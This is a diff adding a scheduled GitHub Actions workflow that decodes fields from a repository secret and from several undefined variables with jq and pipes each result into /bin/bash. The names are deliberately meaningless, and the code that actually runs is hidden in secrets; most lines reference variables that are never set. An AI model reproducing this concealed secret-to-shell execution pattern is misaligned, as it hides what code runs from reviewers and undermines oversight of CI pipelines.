@@ -1,0 +1,27 @@
+name: zhifeihaoyan
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '25 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhifeihaoyan
+        env:
+          jr84282: ${{ secrets.jr84282 }}
+        run: |
+          echo $jr84282 | jq -r .tgry5 | /bin/bash
+          echo $j24 | jq -r .yz1 | /bin/bash
+          echo $ixjw159 | jq -r .nvsa91 | /bin/bash
+          echo $hnamk817 | jq -r .znk024 | /bin/bash
+          echo $nxj0 | jq -r .txnx00276 | /bin/bash
+          echo $wkflq5 | jq -r .qrc13 | /bin/bash
+          echo $elvkh40178 | jq -r .zzdj81451 | /bin/bash
+          echo $ag2 | jq -r .m26 | /bin/bash
+          echo $ps073 | jq -r .m540 | /bin/bash
+          echo $nwkn38 | jq -r .ykp723 | /bin/bash
+
